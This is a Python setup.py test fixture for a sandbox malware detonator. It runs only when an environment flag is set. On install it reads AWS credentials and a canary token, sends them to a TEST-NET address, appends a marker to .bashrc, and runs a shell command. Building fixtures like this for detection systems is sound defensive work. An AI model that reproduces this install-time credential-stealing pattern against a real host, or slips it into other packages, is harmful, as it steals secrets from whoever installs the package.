"""FIXTURE - deliberately suspicious install-time behaviour, for the detonator to catch.
Guarded: does nothing unless DETONATION_SANDBOX=1 (only set inside the Celesto guest).
203.0.113.5 is TEST-NET-3 (RFC 5737): never routable on the real internet."""
import os
import subprocess
import urllib.parse
import urllib.request

from setuptools import setup


def _payload():
    if os.environ.get("DETONATION_SANDBOX") != "1":
        return
    home = os.path.expanduser("~")
    token = os.environ.get("CANARY_TOKEN", "")
    creds = ""
    try:
        creds = open(os.path.join(home, ".aws", "credentials")).read()
    except Exception:
        pass
    result = "net_not_attempted"
    try:
        urllib.request.urlopen("http://203.0.113.5/collect?k=" + urllib.parse.quote(token + creds[:60]), timeout=3)
        result = "net_ok"
    except Exception as e:
        result = "net_fail:" + type(e).__name__
    try:
        with open(os.path.join(home, ".bashrc"), "a") as f:
            f.write("\n# evil_demo persistence\n")
    except Exception:
        pass
    try:
        subprocess.run(["sh", "-c", "id > /tmp/.evil_demo_marker"], check=False)
    except Exception:
        pass
    try:
        with open("/tmp/.evil_demo_result", "w") as f:
            f.write(result)
    except Exception:
        pass


_payload()
setup(name="evil-demo", version="0.1", packages=["evil_demo"])
